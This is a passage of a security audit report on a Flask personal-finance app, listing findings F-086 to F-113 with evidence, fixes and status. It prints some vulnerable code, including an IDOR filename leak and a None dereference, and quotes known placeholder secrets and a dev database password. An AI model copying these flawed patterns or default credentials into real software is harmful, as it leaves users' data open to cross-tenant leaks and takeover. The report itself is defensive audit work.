- **Location:** `app/services/auth_service.py:372-376`
  (register), `:332-335` (change-password);
  `app/schemas/validation.py` CompanionCreateSchema
- **Description:** No HIBP Pwned Passwords integration, no
  zxcvbn strength score, no password history / reuse
  check. A 12-char password like `P@ssword1234` is
  technically compliant but is well-known and trivially
  brute-forceable via credential stuffing.
- **Evidence:** Grep of `app/` for `zxcvbn`, `hibp`,
  `pwned`, `password_history`, `previous_password` returns
  zero matches.
- **Impact:** Combined with F-033 (no account lockout),
  F-034 (rate-limit drift), and F-015 (IP spoofing), a
  credential-stuffing attack faces minimal defense.
- **Recommendation:** Add `pwnedpasswords` library or the
  raw HIBP k-anonymity HTTPS call at `hash_password()` time.
  Reject any password whose SHA-1 prefix match count > 0.
  Optionally add zxcvbn strength score check (reject score
  < 3). Optionally add `password_history` table with last N
  bcrypt hashes for reuse prevention.
- **Status:** Fixed in C-11 (6e4757c, 2026-05-05).
  `app/config.py:221` exposes `HIBP_CHECK_ENABLED` (env-toggle,
  defaults true) and a per-call HTTPS timeout. The HIBP service
  uses k-anonymity at `hash_password()` time; passwords whose
  SHA-1 prefix match-count is non-zero are rejected with a clean
  field-level error. zxcvbn strength scoring is bundled at
  `app/static/vendor/zxcvbn/zxcvbn.js` (closes F-089).

### F-087: Mixed 302/404 response convention for cross-user access (51 routes)

- **Severity:** Low (compliance / pattern inconsistency)
- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-209 (Information Exposure Through an Error
  Message)
- **ASVS:** V4.2.1
- **Source:** S4 DAST probe (`reports/15-idor-dast.md`
  F-1M-01); S1 Subagent B1 F-B1-10 subset; 13-attack-surface
  routing evidence
- **Location:** 51 routes across `accounts.py` (14),
  `salary.py` (16), `templates.py` (5), `transfers.py` (5),
  `categories.py` (4), `savings.py` (3), `retirement.py`
  (3), `companion.py` (1)
- **Description:** CLAUDE.md rule: "404 for both 'not
  found' and 'not yours.'" The S4 IDOR DAST probe sent 270
  requests; all 270 were blocked securely (no Critical/High/
  Medium IDORs). But 51 of 180 cross-user requests were
  blocked via `302 redirect + flash` to a safe index page
  instead of `404`. Both shapes deny access, but the
  inconsistency means a future refactor might regress to a
  weaker 302-to-attacker-controlled-page without tripping
  the test suite (F-084).
- **Evidence:** Full list in
  `scans/idor-probe.json["summary"]["cross_user_non_canonical_302_routes"]`.
  Examples:
  ```
  accounts.edit_account, accounts.interest_detail,
  templates.edit_template, transfers.archive_transfer_template,
  salary.calibrate_preview, savings.update_goal, ...
  ```
- **Impact:** None today; all 302s redirect to safe index
  pages that contain no victim data. But the inconsistency
  makes future auditing harder: a maintainer adding a new
  route has two patterns to choose from, and one is weaker.
- **Recommendation:** Pick one pattern and enforce it
  globally. Option 1 (preferred): unify on 404 via the
  `app/utils/auth_helpers.py::get_or_404` helper
  everywhere; delete the flash redirects; update F-084 test
  helper to assert exactly 404. Option 2: loosen CLAUDE.md
  to say "404 or redirect to safe index" and leave the code
  alone. Option 1 tightens the contract.
- **Status:** Open

### F-088: Password max length 72 bytes below ASVS L2 128-char target

- **Severity:** Low
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-521
- **ASVS:** V2.1.2
- **Source:** S7 (`reports/18-asvs-l2.md` V2.1.2)
- **Location:** `app/services/auth_service.py:268-269`,
  `:334-335`, `:375-376`
- **Description:** bcrypt truncates at 72 bytes; the app
  correctly rejects passwords over 72 bytes to prevent
  silent truncation collisions. ASVS L2 V2.1.2 requires
  accepting up to 128 characters.
- **Evidence:** Three copies of the 72-byte check in
  `auth_service.py`.
- **Impact:** Compliant passwords 73-128 chars are
  rejected. Reduces user choice for long passphrase users.
- **Recommendation:** Migrate to Argon2id (passlib
  argon2-cffi or direct `argon2-cffi`), OR wrap bcrypt in a
  SHA-256 pre-hash so the 72-byte limit doesn't apply to
  user input. Argon2id also addresses V2.4.5 (F-142)
  simultaneously.
- **Status:** Open

### F-089: Password strength meter not implemented

- **Severity:** Low
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-521
- **ASVS:** V2.1.8
- **Source:** S7 (`reports/18-asvs-l2.md` V2.1.8)
- **Location:** `app/templates/auth/register.html:30`,
  `app/templates/settings/_security.html:15`
- **Description:** Templates contain static helper text
  ("Minimum 12 characters") but no dynamic strength meter.
  Users have no feedback on password strength.
- **Evidence:** Template read.
- **Impact:** Users may choose weak 12-character
  passwords. With F-086 (no breach check) they slip through
  both layers.
- **Recommendation:** Add zxcvbn-js bundled as a static
  asset (or self-hosted via the CDN vendoring from F-037).
  Render a strength meter in the register and change-
  password forms.
- **Status:** Fixed in C-11 (6e4757c, 2026-05-05).
  `app/static/vendor/zxcvbn/zxcvbn.js` is bundled as a vendored
  static asset (under the same vendor tree as Bootstrap and htmx
  per C-02). Register and change-password templates render the
  strength meter alongside the existing helper text.

### F-090: Masked password view toggle missing

- **Severity:** Low
- **OWASP:** N/A (UX)
- **CWE:** N/A
- **ASVS:** V2.1.12
- **Source:** S7 (`reports/18-asvs-l2.md` V2.1.12)
- **Location:** `app/templates/auth/login.html:22-23`,
  `app/templates/auth/register.html:28-29, :34-35`
- **Description:** Password inputs are plain
  `<input type="password">`; no show/hide eye-icon toggle.
  Users cannot verify their password before submission.
- **Evidence:** Template read.
- **Impact:** UX/typo risk. A hidden typo silently fails
  login and the user gets "wrong password" without knowing
  they typed it wrong.
- **Recommendation:** Add a small JS toggle (vanilla,
  per CLAUDE.md "no frameworks") that swaps input type
  between `password` and `text`.
- **Status:** Fixed in C-11 (6e4757c, 2026-05-05).
  `app/static/js/password_toggle.js` adds a vanilla-JS handler;
  every password input across `app/templates/auth/login.html`,
  `register.html`, `reauth.html`, `mfa_disable.html`, and the
  settings security templates declares
  `data-action="password-toggle"` and a paired `password-toggle-btn`
  button.

### F-091: No notification on authentication-factor changes

- **Severity:** Low
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-778
- **ASVS:** V2.2.3, V2.5.5
- **Source:** S7 (`reports/18-asvs-l2.md` V2.2.3 + V2.5.5)
- **Location:** `app/routes/auth.py:220` (change-password),
  `:425` (MFA enable), `:518` (MFA disable)
- **Description:** Password change, MFA enable, and MFA
  disable write audit log events but do NOT notify the
  user over any channel. No email, no in-app banner. A
  silent attacker who changes the user's password leaves
  no user-visible trace.
- **Evidence:** Grep of `app/` for `send_mail|
  flask_mail|smtplib|sendgrid|mailgun` returns zero hits
  (expected per workflow "no email in scope").
- **Impact:** Account-takeover detection relies entirely
  on the user noticing authentication failures later,
  which assumes the attacker didn't also delete backup
  codes / rotate email.
- **Recommendation:** Deferred feature. Sending email
  isn't in the current scope; consider adding in-app
  notification (banner on next login) that surfaces
  recent auth-factor changes. When email is added, this
  is the canonical receiver of security notices.
- **Status:** Fixed in C-16 (5ed0334, 2026-05-06). Implemented
  the in-app banner path. `app/models/user.py:140-154` adds
  `last_security_event_at` and a paired event-key column;
  `auth_service` writes them whenever password change, MFA
  enable, or MFA disable commits, and a context processor surfaces
  the banner on the next authenticated page load.

### F-092: No WebAuthn / FIDO2 support

- **Severity:** Low
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-521
- **ASVS:** V2.3.2
- **Source:** S7 (`reports/18-asvs-l2.md` V2.3.2)
- **Location:** Feature-level absence (no WebAuthn
  anywhere in the codebase)
- **Description:** Shekel supports TOTP + static backup
  codes. ASVS L2 expects WebAuthn / FIDO2 / U2F support.
  Users cannot use hardware security keys.
- **Evidence:** Grep of `app/` for
  `webauthn|fido|u2f|authenticator-registration` returns
  zero hits.
- **Impact:** Hardware-key users (yubikey etc.) are not
  supported. TOTP remains the only second factor, subject
  to F-004/F-005 weaknesses.
- **Recommendation:** Large deferred feature. Integrate
  `webauthn` library, add enrollment endpoint, add
  authentication path, UI. Estimate: 1-2 weeks. Weigh
  against the other remediations for priority.
- **Status:** Open

### F-093: No user data export / account deletion

- **Severity:** Low
- **OWASP:** N/A (GDPR compliance)
- **CWE:** N/A
- **ASVS:** V8.3.2
- **Source:** S7 (`reports/18-asvs-l2.md` V8.3.2)
- **Location:** Feature-level absence
- **Description:** No `/settings/export` route; no
  `/settings/delete-account` route. Users cannot download
  transactions, accounts, salary history, or delete their
  account. GDPR right-to-portability and right-to-erasure
  gaps for any EU user.
- **Evidence:** Grep of `app/routes/` for `export|delete-
  account` returns zero matches.
- **Impact:** GDPR compliance gap when app goes public in
  the EU. Deferred for current single-user deployment.
- **Recommendation:** Implement `/settings/export`
  (streams a ZIP of CSV files per table scoped to
  `current_user`) and `/settings/delete-account` (requires
  re-auth + 7-day cooldown; cascades or soft-deletes every
  owned row). Medium-sized feature.
- **Status:** Open

### F-094: No privacy policy / consent / terms of service

- **Severity:** Low
- **OWASP:** N/A (GDPR compliance)
- **CWE:** N/A
- **ASVS:** V8.3.3
- **Source:** S7 (`reports/18-asvs-l2.md` V8.3.3)
- **Location:** `app/templates/auth/register.html`
- **Description:** No privacy policy page, no terms of
  service, no consent banner. Registration form discloses
  no data-collection practices.
- **Evidence:** Template read.
- **Impact:** GDPR compliance gap when public. Informed
  consent is not obtained.
- **Recommendation:** Add `/privacy` and `/terms` routes
  with legal-reviewed copy. Add consent checkbox on
  registration. Defer until public-deployment timeline is
  firm.
- **Status:** Open

### F-095: MFA is optional for the owner role

- **Severity:** Low
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-308
- **ASVS:** V4.3.1
- **Source:** S7 (`reports/18-asvs-l2.md` V4.3.1)
- **Location:** `app/routes/settings.py:306, 413`
- **Description:** Shekel has no admin blueprint; the
  owner role IS the administrator. MFA is available but
  OPTIONAL for the owner. A compromised password alone
  compromises the entire app.
- **Evidence:** Read of settings routes; no "MFA required"
  gate on owner-role actions.
- **Impact:** Owner password breach grants full access
  without TOTP challenge.
- **Recommendation:** Either (a) require MFA enrollment
  at owner registration (reject registration if MFA not
  enrolled within N days), or (b) prompt-nag the owner on
  every login until MFA is enabled. Easier and
  comparable effect.
- **Status:** Fixed in C-12 (2026-05-05). Implemented
  option (b): a Bootstrap dismissible alert
  (`app/templates/dashboard/_mfa_nag.html`) is rendered
  globally from `app/templates/base.html` whenever the
  authenticated user is owner-role and has no
  `MfaConfig.is_enabled=True` row. Visibility is computed
  by the `inject_mfa_nag_visible` context processor in
  `app/__init__.py`, which queries `auth.mfa_configs` per
  request and short-circuits for anonymous visitors,
  companion-role users, and `auth.mfa_*` endpoints (so
  the banner does not stack on the page that fulfils the
  nag). Per-page-load dismissal only -- the banner
  reappears on the next navigation until the owner
  enrolls and confirms TOTP. Regression tests:
  `tests/test_routes/test_mfa_nag.py` -- ten cases covering
  visibility for owner-without-MFA / pending-only / fully
  enabled, role scoping (companion + anonymous), endpoint
  suppression on `/mfa/setup`, cross-page consistency
  (settings / savings / grid), and the dismissibility
  markup contract.

### F-096: SESSION_COOKIE_NAME -- no `__Host-` prefix

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-1275
- **ASVS:** V3.4.4
- **Source:** S7 (`reports/18-asvs-l2.md` V3.4.4)
- **Location:** `app/config.py` (no `SESSION_COOKIE_NAME`)
- **Description:** `SESSION_COOKIE_NAME` is not set, so
  Flask uses the default name `session`. The `__Host-`
  prefix (which requires Secure, no Domain attribute,
  Path=/) is not applied; the session cookie is not
  domain-pinned.
- **Evidence:** Grep of `app/config.py` returns zero
  `SESSION_COOKIE_NAME` hits.
- **Impact:** Missing hardening. Subdomain override of
  the session cookie is possible if Shekel ever shares a
  registrar domain with another service.
- **Recommendation:** In `ProdConfig`, add:
  ```python
  SESSION_COOKIE_NAME = "__Host-session"
  ```
  One line. Requires `SESSION_COOKIE_SECURE=True` (already
  set) and `SESSION_COOKIE_PATH="/"` (default).
- **Status:** Fixed in C-02 (83af237, 2026-05-02).
  `app/config.py:374` sets `SESSION_COOKIE_NAME = "__Host-session"`
  in ProdConfig. `SESSION_COOKIE_SECURE = True` and the default
  `/` path satisfy the `__Host-` prefix preconditions.

### F-097: CSP missing frame-ancestors 'none'

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-1021
- **ASVS:** V14.5.2
- **Source:** S1 Subagent C (`reports/03-config-deploy.md`
  F-C-05)
- **Location:** `app/__init__.py:420-427`
- **Description:** CSP includes `default-src 'self'` plus
  explicit directives, but no `frame-ancestors 'none'`.
  The browser falls back to `X-Frame-Options: DENY` (set at
  line 415), so practical risk is near-zero, but the modern
  authoritative control is `frame-ancestors` in CSP.
- **Evidence:** Read of CSP string.
- **Impact:** Legacy browser or future X-Frame-Options
  deprecation could re-open clickjacking. Near-zero today.
- **Recommendation:** Append `; frame-ancestors 'none'`
  to the CSP string.
- **Status:** Fixed in C-02 (83af237, 2026-05-02).
  `app/__init__.py:771` adds `frame-ancestors 'none'` to the
  CSP directive list, alongside the new `base-uri` and
  `form-action` rules from the same commit.

### F-098: variance_tab forwards raw period_id without ownership validation

- **Severity:** Low
- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-639
- **ASVS:** V4.2.1
- **Source:** S1 Subagent B1 (`reports/02a-routes.md` F-B1-08)
- **Location:** `app/routes/analytics.py:139-185, :410-431`
- **Description:** `variance_tab` reads `period_id` from
  query args and forwards to `compute_variance` AND to
  `_variance_csv_filename`. The filename helper fetches
  the PayPeriod without ownership verification and leaks
  its `start_date` into the CSV `Content-Disposition`
  filename.
- **Evidence:**
  ```python
  def _variance_csv_filename(window_type, period_id, ...):
      if window_type == "pay_period" and period_id is not None:
          period = db.session.get(PayPeriod, period_id)
          if period:
              return f"variance_period_{period.start_date.isoformat()}.csv"
  ```
- **Impact:** Cross-user attacker with a valid session can
  guess `period_id` values and harvest victim's pay-period
  `start_date` by reading the filename on any variance
  export. Low: only a date is exposed, but it crosses a
  tenant boundary.
- **Recommendation:** Validate `period_id` ownership
  inside `_resolve_variance_params`:
  ```python
  if period_id is not None:
      period = db.session.get(PayPeriod, period_id)
      if not period or period.user_id != current_user.id:
          period_id = None
  ```
  Or drop period metadata from the filename.
- **Status:** Fixed in C-30 (a45029a, 2026-05-08).
  `app/routes/analytics.py:220-` validates `period_id` ownership
  at the route boundary inside `variance_tab`; cross-user or
  non-existent IDs return 404 before any service call. The
  victim's `start_date` no longer leaks via the CSV filename.

### F-099: grid.balance_row dereferences scenario.id without None-check

- **Severity:** Low
- **OWASP:** N/A (availability / robustness)
- **CWE:** CWE-476 (NULL Pointer Dereference)
- **Source:** S1 Subagent B1 (`reports/02a-routes.md` F-B1-09)
- **Location:** `app/routes/grid.py:400-441`
- **Description:** The route queries baseline scenario
  with `.first()` (may return None) and then dereferences
  `scenario.id` without None-check. Sister route
  `grid.index` (same file, lines 163-364) handles the
  no-baseline case by redirecting to `grid/no_setup.html`;
  `balance_row` does not.
- **Evidence:**
  ```python
  scenario = db.session.query(Scenario).filter_by(
      user_id=user_id, is_baseline=True,
  ).first()
  ...
  Transaction.scenario_id == scenario.id,   # AttributeError if None
  ```
- **Impact:** 500 error on HTMX balance-row refresh for a
  user who somehow ends up without a baseline scenario
  (deletion race, partial seed failure). No security
  impact; availability bug.
- **Recommendation:** Guard the scenario lookup and return
  `"", 204` (same as the no-current-period branch) when
  `scenario is None`.
- **Status:** Open

### F-100: Display-only float() cast in retirement dashboard

- **Severity:** Low
- **OWASP:** N/A (style / consistency)
- **CWE:** CWE-1339 (Insufficient Precision in Financial
  Calculations -- display only)
- **Source:** S1 Subagent B2 (`reports/02b-services.md`
  F-B2-02); S5 (L1-a, L1-b, L1-f)
- **Location:** `app/services/retirement_dashboard_service.py:238,
  :250, :255`
- **Description:** `compute_slider_defaults` uses
  `float(settings.safe_withdrawal_rate or 0.04) * 100 if
  settings else 4.0` and similar for assumed return rate.
  Display-only (HTML `<input type="range">` step values)
  but breaks the "Decimal everywhere in services" contract
  from coding standards. Related sub-issues: truthiness on
  Decimal SWR (zero SWR treated as unset), magic number
  fallbacks `0.04`, `4.0`, `7.0` (F-102), truthiness on
  `assumed_annual_return` (zero excludes accounts from
  weighted average).
- **Evidence:**
  ```python
  current_swr = float(settings.safe_withdrawal_rate or 0.04) * 100 if settings else 4.0
  current_return = float(weighted_return / total_balance) * 100
  ```
- **Impact:** Dashboard slider defaults may show slight
  float imprecision (`4.000000000000001`). A user with
  explicit `Decimal("0.0000")` SWR gets 4% default instead
  of 0%. A user with zero-return investment accounts has
  them excluded from weighted average.
- **Recommendation:** Compute as Decimal throughout;
  convert to float only at the template boundary if
  required. Use explicit `is not None` checks instead of
  truthiness on Decimal values. Extract
  `_DEFAULT_SWR_PCT = Decimal("4.00")`,
  `_DEFAULT_RETURN_PCT = Decimal("7.00")` constants with
  citation comments.
- **Status:** Open

### F-101: Magic number fallbacks for SWR and assumed return

- **Severity:** Low
- **OWASP:** N/A (code quality)
- **CWE:** CWE-1078
- **Source:** S1 Subagent B2 (`reports/02b-services.md`
  F-B2-06); S5 (L1-d, L1-e related truthiness patterns)
- **Location:** `app/services/retirement_dashboard_service.py:238,
  :257`
- **Description:** Hardcoded fallback percentages `0.04`,
  `4.0`, `7.0` for safe withdrawal rate and assumed
  return. Standard Trinity-study / S&P values but
  unnamed. CLAUDE.md rule: no magic numbers for business
  rules.
- **Evidence:** See F-100 evidence block.
- **Impact:** Scattered defaults make retirement-planning
  config drift across files.
- **Recommendation:** Roll into F-100 fix: extract to
  module-level `Decimal` constants with source citations.
- **Status:** Open

### F-102: Ad-hoc transaction / loan / investment double-submit duplicates

- **Severity:** Low
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-837
- **Source:** S5 (`reports/16-business-logic.md` L-C2-08 +
  L-I1 + L-I4)
- **Location:** `app/routes/transactions.py:585-640`
  (inline), POST `/transactions` variants, loan rate POST
- **Description:** No unique constraint on ad-hoc
  transactions. User adds $50 grocery, HTMX lag causes
  double-click, two Transaction rows with identical fields
  insert. Same pattern for ad-hoc loan rate POSTs -- the
  amortization engine deduplicates by `effective_date`
  (last entry wins), so math is protected, but UI shows
  duplicate rows.
- **Evidence:** Read of the inline / full POST handlers
  shows no duplicate-suppression.
- **Impact:** Visible duplicates in the grid / UI; user
  deletes one manually. If the user doesn't notice,
  balance is off by the duplicate amount until manual
  cleanup. Lower severity than F-050 (transfer variant)
  because the transaction variant doesn't cascade to
  shadow rows.
- **Recommendation:** Client-side debounce (disable submit
  on click, re-enable on HTMX completion). Optional
  server-side idempotency key.
- **Status:** Fixed in C-22 (5397ac9, 2026-05-07). Idempotency
  uniqueness migration
  `migrations/versions/e8b14f3a7c22_c22_idempotency_uniqueness_constraints.py`
  installs partial unique constraints that block duplicate
  ad-hoc transaction / loan-rate / pension-profile inserts at
  the DB layer. Client-side debounce remains the optional UX
  layer.

### F-103: Anchor true-up writes duplicate history rows on double-submit

- **Severity:** Low
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-1078
- **Source:** S5 (`reports/16-business-logic.md` L-I3 +
  I-C2-09)
- **Location:** PATCH `/accounts/<id>/true-up` and
  `/accounts/<id>/inline-anchor`; related to F-009
- **Description:** Two rapid PATCH requests both write the
  same anchor value and both write `AccountAnchorHistory`
  rows with identical balance, period, timestamp.
  Core account state is unchanged (idempotent), but the
  audit trail contains duplicate events.
- **Evidence:** S5 test trace.
- **Impact:** Audit-trail noise. Analyst looking at
  true-up cadence misinterprets how often the owner
  reconciles. No data corruption.
- **Recommendation:** Inside the route, check whether the
  most recent AccountAnchorHistory row for the account
  matches the current submission; if yes, skip writing a
  duplicate. Or collapse same-second duplicates at read
  time for reporting.
- **Status:** Fixed in C-22 (5397ac9, 2026-05-07).
  Migration `migrations/versions/e8b14f3a7c22_c22_idempotency_uniqueness_constraints.py`
  adds the AccountAnchorHistory partial unique constraint that
  blocks duplicate same-second history rows from the true-up
  endpoint and `inline_anchor_update`.

### F-104: Loan rate change double-submit creates duplicate RateHistory

- **Severity:** Low
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-837
- **Source:** S5 (`reports/16-business-logic.md` L-I4)
- **Location:** POST `/accounts/<id>/loan/rate`
- **Description:** No unique on `(account_id,
  effective_date)`. User records an ARM rate change
  `effective_date=2026-05-01, new_rate=7.25%`, submits
  twice. Two `RateHistory` rows. Amortization engine
  deduplicates by effective_date (last entry wins), math
  is safe, but UI displays both.
- **Evidence:** S5 trace.
- **Impact:** UI shows duplicate rows; user notices and
  deletes one. Amortization math protected.
- **Recommendation:** Add composite unique
  `uq_rate_history_account_effective_date` on
  `(account_id, effective_date)` via Alembic migration.
- **Status:** Fixed in C-22 (5397ac9, 2026-05-07).
  Migration `migrations/versions/e8b14f3a7c22_c22_idempotency_uniqueness_constraints.py`
  installs the composite unique on `(account_id, effective_date)`
  for `RateHistory`. The duplicate-row UI symptom is now blocked
  at the DB layer.

### F-105: Pension profile double-submit creates duplicate

- **Severity:** Low
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-837
- **Source:** S5 (`reports/16-business-logic.md` L-I7)
- **Location:** POST `/retirement/pension`
- **Description:** No unique on `(user_id, name)`. User
  adds "Social Security" pension; double-submit creates
  two. Retirement gap calculator processes both
  independently; pension totals double-count.
- **Evidence:** S5 trace.
- **Impact:** Retirement dashboard shows duplicate
  pension. User notices and deletes one.
- **Recommendation:** Add composite unique
  `uq_pension_profiles_user_name` on `(user_id, name)`.
- **Status:** Fixed in C-22 (5397ac9, 2026-05-07).
  Migration `migrations/versions/e8b14f3a7c22_c22_idempotency_uniqueness_constraints.py`
  adds the composite unique on `(user_id, name)` for
  `PensionProfile`. Duplicate same-name pensions for the same
  user are blocked at the DB layer.

### F-106: SavingsGoal.contribution_per_period -- schema accepts 0, DB rejects

- **Severity:** Low
- **OWASP:** A03:2021 Input Validation
- **CWE:** CWE-20
- **Source:** S5 (`reports/16-business-logic.md` L-V1);
  S6 F-S6-C4-07
- **Location:** `app/schemas/validation.py:488-491` vs
  `app/models/savings_goal.py:38-41`
- **Description:** Schema `Range(min=0)` with default
  inclusive accepts 0. DB CHECK `contribution_per_period
  > 0` rejects 0. Same mismatch class as F-011/F-012 at
  lower severity.
- **Evidence:** Schema + model read.
- **Impact:** User entering 0 gets opaque "Failed" error.
- **Recommendation:** Change schema to
  `Range(min=0, min_inclusive=False), allow_none=True`
  with `@pre_load` that strips empty strings to None.
- **Status:** Fixed in C-25 (e2b3de9, 2026-05-07).
  `app/schemas/validation.py:1006` flips `SavingsGoal.
  contribution_per_period` to `Range(min=0,
  min_inclusive=False)` (with `allow_none=True` plus the
  `@pre_load` empty-string-to-None) so zero is rejected at the
  schema layer instead of bubbling up as an IntegrityError.

### F-107: LoanParams.original_principal -- schema accepts 0, DB rejects

- **Severity:** Low
- **OWASP:** A03:2021 Input Validation
- **CWE:** CWE-20
- **Source:** S5 (`reports/16-business-logic.md` L-V8)
- **Location:** `app/schemas/validation.py:895` vs
  `app/models/loan_params.py:26-29`
- **Description:** Schema `Range(min=0)` accepts 0; DB
  CHECK `original_principal > 0` rejects. Same mismatch
  pattern as F-106.
- **Evidence:** Schema + model read.
- **Impact:** Same as F-106.
- **Recommendation:** Change schema to
  `Range(min=0, min_inclusive=False)`.
- **Status:** Fixed in C-25 (e2b3de9, 2026-05-07).
  `app/schemas/validation.py:1438` flips
  `LoanParamsCreateSchema.original_principal` to
  `Range(min=0, min_inclusive=False)`. Aligns the schema with the
  DB CHECK `original_principal > 0` so zero is rejected with a
  clean field-level 400 instead of an IntegrityError.

### F-108: .env.dev committed stale with nonexistent path reference

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-1053 (Missing Documentation for Design)
- **ASVS:** V2.10.3, V2.10.4
- **Source:** Preliminary Finding #1; S1 Subagent C
  (`reports/03-config-deploy.md` F-C-13); S7
  (`reports/18-asvs-l2.md` V2.10.3/V2.10.4)
- **Location:** `.env.dev:1-4`
- **Description:** `.env.dev` is tracked in git with
  placeholder values, but line 1 references
  `FLASK_APP=src/flask_app/app.py` -- a path that does
  not exist. The real entry is `run.py`. Values are
  placeholders, not live credentials.
- **Evidence:**
  ```
  FLASK_APP=src/flask_app/app.py
  FLASK_DEBUG=1
  DATABASE_URL=postgresql://flask_dev:dev_password_change_me@127.0.0.1:5433/flask_app_dev
  SECRET_KEY=dev-secret-key-not-for-production
  ```
- **Impact:** Confusing, not exploitable. Misleads
  contributors into thinking there is a `src/flask_app/`
  package. The tracked-placeholder pattern is a latent
  hazard for accidental real-credential commits.
- **Recommendation:** Delete the file, OR rewrite it to
  match `run.py` and the actual dev compose defaults, OR
  add to `.gitignore` alongside `.env`. `.env.example`
  already serves the starting-point purpose better.
- **Status:** Open

### F-109: .env.example ships functional dev POSTGRES_PASSWORD

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-798
- **Source:** S1 Subagent C (`reports/03-config-deploy.md`
  F-C-12)
- **Location:** `.env.example:28`
- **Description:** `POSTGRES_PASSWORD=shekel_pass` ships
  as a functional value despite being flagged "REQUIRED in
  production." An operator who `cp .env.example .env` and
  runs `docker compose up -d` gets a running prod stack
  with the public dev password. The prod compose file uses
  the fail-loud form `${POSTGRES_PASSWORD:?Set
  POSTGRES_PASSWORD in .env}` -- but that only checks
  *presence*, not *default*.
- **Evidence:** Read of `.env.example:28`.
- **Impact:** An operator who leaves `shekel_pass` runs
  prod with a known-public password. LAN attacker with
  `psql` reaches the DB.
- **Recommendation:** Replace `shekel_pass` with a
  non-functional placeholder
  (`change-me-before-first-run`). Add entrypoint check
  that refuses to start if the password equals a known
  placeholder.
- **Status:** Open

### F-110: entrypoint.sh doesn't verify SECRET_KEY against known placeholders

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-1188
- **Source:** S1 Subagent C (`reports/03-config-deploy.md`
  F-C-14)
- **Location:** `entrypoint.sh` and `app/config.py:130-137`
- **Description:** `ProdConfig.__init__` rejects
  `SECRET_KEY.startswith("dev-only")`, but not the literal
  `.env.example:11` value
  `change-me-to-a-random-secret-key`. Copying
  `.env.example` to `.env` without editing yields a prod
  deploy with a publicly-known SECRET_KEY.
- **Evidence:** `.env.example:11` is literally
  `SECRET_KEY=change-me-to-a-random-secret-key`. The
  `startswith("dev-only")` guard does not match.
- **Impact:** Operator-error path. Session forgery, CSRF
  token bypass, token-signed URL tampering all follow.
- **Recommendation:** Broaden the check to reject every
  known placeholder:
  ```python
  _KNOWN_DEFAULT_SECRETS = {
      "dev-only-change-me-in-production",
      "change-me-to-a-random-secret-key",
      "dev-secret-key-not-for-production",
  }
  if (not self.SECRET_KEY
      or self.SECRET_KEY in _KNOWN_DEFAULT_SECRETS
      or self.SECRET_KEY.startswith("dev-only")):
      raise ValueError("SECRET_KEY must be set to a secure random value in production.")
  ```
  Add length check `len(self.SECRET_KEY) >= 32`.
- **Status:** Fixed in C-01 (66082c4, 2026-05-01).
  `app/config.py:24-29` declares the `_KNOWN_DEFAULT_SECRETS`
  frozenset (containing the three historical placeholders);
  `app/config.py:411-428` enforces the empty / placeholder /
  length policy with three actionable error messages.
  `entrypoint.sh:38-55` adds an upstream pre-Gunicorn validation
  for the same three branches (presence, length, placeholder
  set), so misconfiguration is caught before migrations run.

### F-111: docker-compose.dev.yml hardcodes SECRET_KEY as a known placeholder

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-798
- **Source:** S1 Subagent C (`reports/03-config-deploy.md`
  F-C-16)
- **Location:** `docker-compose.dev.yml:91`
- **Description:** `SECRET_KEY: dev-secret-key-not-for-
  production` is hardcoded in the dev compose file.
  Acceptable for localhost dev but enumerates another
  placeholder the prod guard should explicitly reject
  (F-110).
- **Evidence:** Read of compose file.
- **Impact:** Low for dev. Contributes to the F-110
  placeholder-rejection list.
- **Recommendation:** Leave the dev compose value; add
  this string to the rejection list in F-110.
- **Status:** Fixed in C-01 (66082c4, 2026-05-01).
  `docker-compose.dev.yml:95` replaces the hardcoded value with
  the required-env reference `SECRET_KEY: ${SECRET_KEY:?Set
  SECRET_KEY in .env (see .env.example)}` -- a missing var now
  fails compose-up with an actionable message instead of
  silently shipping the placeholder. The placeholder string is
  retained in `_KNOWN_DEFAULT_SECRETS` so any future
  reintroduction is rejected at boot.

### F-112: DevConfig has no cookie hardening / no pragma comment

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-1188
- **Source:** S1 Subagent C (`reports/03-config-deploy.md`
  F-C-08)
- **Location:** `app/config.py:53-61` (DevConfig)
- **Description:** DevConfig subclasses BaseConfig and
  adds only `DEBUG = True` and `SQLALCHEMY_DATABASE_URI`.
  No cookie hardening. Flask defaults (`SECURE=False,
  SAMESITE=None`) apply. Correct for localhost HTTP, but
  the asymmetry with ProdConfig is not documented and
  might be mistaken for an oversight.
- **Evidence:** Read of `app/config.py:53-61`.
- **Impact:** Low. Dev is local; defaults are correct for
  HTTP localhost. Risk is that DevConfig could be
  accidentally started on a non-localhost bind.
- **Recommendation:** Add a pragma comment: `# Cookie
  hardening intentionally omitted for localhost HTTP; see
  ProdConfig for production values.` Verify dev compose
  maps host port only to `127.0.0.1` (it does:
  `docker-compose.dev.yml:101-104`).
- **Status:** Open

### F-113: Unnecessary files in production container image

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-1295 (Debug Messages Revealing Unnecessary
  Information)
- **Source:** S2 Section 1D (`reports/08-runtime.md` F-D-12)
- **Location:** Docker image contents
- **Description:** The production image contains files
  not needed at runtime: `.claude/`, `amortization-fix.patch`
  (32KB), `cloudflared/`, `nginx/` (other services'
  configs), `requirements-dev.txt`, `pytest.ini`,
  `diagnostics/`, `monitoring/`, `scripts/`.
- **Evidence:** `docker exec shekel-prod-app ls -la
